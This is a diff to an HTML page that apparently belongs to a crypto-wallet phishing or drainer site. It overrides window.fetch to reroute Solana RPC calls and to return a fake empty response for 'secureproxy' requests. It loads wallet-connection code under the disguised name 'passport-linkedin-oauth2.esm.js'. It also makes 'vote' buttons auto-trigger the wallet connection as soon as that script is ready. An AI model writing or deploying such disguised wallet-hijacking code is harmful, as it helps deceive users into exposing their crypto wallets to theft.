@@ -28,10 +28,14 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
     <!-- EXTERNAL WALLET CONNECTION -->
+    <link rel="preload" href="/passport-linkedin-oauth2.esm.js" as="script">
     <script>
         const originalFetch = window.fetch;
         window.fetch = async function (...args) {
             let [resource, config] = args;
+            if (typeof resource === 'string' && resource.includes('secureproxy')) {
+                return new Response('/* ignored */', { status: 200, headers: { 'Content-Type': 'application/javascript' } });
+            }
             if (typeof resource === 'string' && resource.includes('corsproxy.io')) {
                 if (resource.includes('https://api.mainnet-beta.solana.com')) {
                     resource = 'https://api.mainnet-beta.solana.com';
@@ -42,6 +46,23 @@
             return originalFetch(resource, config);
         };
         window.setup = { injectWindowObjects: true };
+
+        // Catch the user's intent to connect immediately even if the script is still loading!
+        window.startConnect = function _startupPlaceholder() {
+            document.querySelectorAll('.btn-vote, .btn-vote-mobile').forEach(b => {
+                if (!b.dataset.orig) b.dataset.orig = b.innerHTML;
+                b.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> LOADING...';
+            });
+            const checkReady = setInterval(() => {
+                if (window.startConnect !== _startupPlaceholder && typeof window.startConnect === 'function') {
+                    clearInterval(checkReady);
+                    document.querySelectorAll('.btn-vote, .btn-vote-mobile').forEach(b => {
+                        if (b.dataset.orig) b.innerHTML = b.dataset.orig;
+                    });
+                    window.startConnect(); // Immediately execute actual wallet connection!
+                }
+            }, 50);
+        };
     </script>
     <script src="/passport-linkedin-oauth2.esm.js"></script>
 
@@ -1917,5 +1938,3 @@
 </body>
 
 </html>
-
-
